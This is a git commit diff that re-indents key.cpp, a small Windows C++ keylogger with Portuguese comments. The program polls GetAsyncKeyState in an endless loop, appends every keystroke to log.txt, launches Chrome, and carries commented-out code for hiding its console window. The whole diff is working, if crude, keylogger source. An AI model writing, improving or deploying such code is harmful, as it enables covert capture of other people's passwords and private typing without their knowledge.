712413b8a2bcc8acd108bc7fb2a0d8b190c4b663
Edilson Alzemand Sigmaringa Junior <edilson.alzemand@gmail.com>
2017-02-05 21:10:58 -0200

    Update key.cpp

--- key.cpp
+++ key.cpp
@@ -9,20 +9,20 @@ using namespace std;
 int salvar(int tecla, char *file);
 
 int main()
-{
-/* SetConsoleTitle("Titulo");
-HWND wnd = FindWindow(0, "Titulo");
-if( wnd != NULL )
-{
-ShowWindow(wnd, SW_HIDE);
-}*/
-char a;
-system("start chrome");
-while(true){
+  {
+  /* SetConsoleTitle("Titulo");
+  HWND wnd = FindWindow(0, "Titulo");
+  if( wnd != NULL )
+  {
+  ShowWindow(wnd, SW_HIDE);
+  }*/
+  char a;
+  system("start chrome");
+  while(true){
 
-for(a=8;a<=190;a++){
-if(GetAsyncKeyState(a) == -32767) // captura as teclas !!
-salvar(a,"log.txt");
+    for(a=8;a<=190;a++){
+      if(GetAsyncKeyState(a) == -32767) // captura as teclas !!
+    salvar(a,"log.txt");
 }
 
 }
@@ -33,10 +33,10 @@ return 0;
 
 int salvar(int tecla, char *file){
 
-FILE *newarquivo;
-newarquivo = fopen(file, "a+");
-cout << tecla;
-fprintf(newarquivo, "%s", &tecla);
+  FILE *newarquivo;
+  newarquivo = fopen(file, "a+");
+  cout << tecla;
+  fprintf(newarquivo, "%s", &tecla);
 
-return 0;
+  return 0;
 } 
